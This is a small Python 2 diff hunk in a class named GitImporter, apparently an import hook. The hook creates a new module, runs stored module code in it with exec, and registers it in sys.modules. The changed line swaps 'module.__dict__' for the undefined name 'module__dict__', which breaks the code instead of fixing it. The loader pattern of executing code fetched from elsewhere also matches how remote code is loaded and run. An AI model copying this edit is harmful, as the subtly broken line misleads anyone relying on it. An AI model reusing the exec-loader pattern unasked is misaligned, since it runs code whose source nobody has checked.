@@ -43,7 +43,7 @@ class GitImporter(object):
 
         module = imp.new_module(name)
 
-        exec self.current_module_code in module.__dict__
+        exec self.current_module_code in module__dict__
 
         sys.modules[name] = module
 
